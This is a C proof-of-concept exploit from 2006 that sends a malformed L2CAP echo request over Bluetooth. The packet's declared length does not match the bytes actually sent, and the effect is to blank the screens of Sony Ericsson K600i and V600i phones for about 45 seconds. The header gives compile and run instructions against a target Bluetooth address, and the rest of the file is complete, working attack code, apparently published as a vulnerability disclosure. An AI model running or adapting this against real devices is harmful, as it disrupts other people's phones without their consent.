/*	Sony/Ericsson K600i reset display - PoC			*/
/* 	Pierre BETOUIN <pierre.betouin@security-labs.org>	*/
/*	02-01-2006						*/
/*	Vulnerability found using BSS fuzzer :			*/
/*		http://securitech.homeunix.org/blue/		*/
/*								*/
/*	Causes anormal behaviours on some Sony/Ericsson 	*/
/*	cell phones 						*/
/*	Vulnerable tested devices :				*/
/*		- K 600i					*/
/*		- V 600i					*/
/*		- And maybe other ones... 			*/
/*								*/
/*	Vulnerable devices will slowly turn their screen into 	*/
/*	black and then display a white screen. 			*/
/*	After a short period (~45sec), they will go back to 	*/
/*	their normal behaviour					*/
/*								*/
/*	gcc -lbluetooth reset_display_K600i.c 			*/
/*		-o reset_display_K600i				*/
/*	./reset_display_K600i 00:12:EE:XX:XX:XX			*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#define SIZE		15
#define FAKE_SIZE	12

int main(int argc, char **argv)
{
    char *dataBuffer;
    l2cap_cmd_hdr *command;    
    struct sockaddr_l2 address;
    int socketFd, bytesSent, currentIndex;

    if(argc < 2)
    {
        fprintf(stderr, "%s <btaddr>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    
    if ((socketFd = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
    {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&address, 0, sizeof(address));
    address.l2_family = AF_BLUETOOTH;

    if (bind(socketFd, (struct sockaddr *) &address, sizeof(address)) < 0) 
    {
        perror("bind");
        exit(EXIT_FAILURE);
    }

    str2ba(argv[1], &address.l2_bdaddr);
    
    if (connect(socketFd, (struct sockaddr *) &address, sizeof(address)) < 0) 
    {
        perror("connect");
        exit(EXIT_FAILURE);
    }
    
    if(!(dataBuffer = (char *) malloc ((int) SIZE + 1))) 
    {
        perror("malloc");
        exit(EXIT_FAILURE);
    }
    
    memset(dataBuffer, 'A', SIZE);

    command = (l2cap_cmd_hdr *) dataBuffer;
    command->code = L2CAP_ECHO_REQ;
    command->ident = 1;
    command->len = FAKE_SIZE;
    
    if( (bytesSent=send(socketFd, dataBuffer, SIZE, 0)) >= 0)
    {
        printf("L2CAP packet sent (%d)\n", bytesSent);
    }

    printf("Buffer:\t");
    for(currentIndex=0; currentIndex<bytesSent; currentIndex++)
        printf("%.2X ", (unsigned char) dataBuffer[currentIndex]);
    printf("\n");

    free(dataBuffer);
    close(socketFd);
    return EXIT_SUCCESS;
}
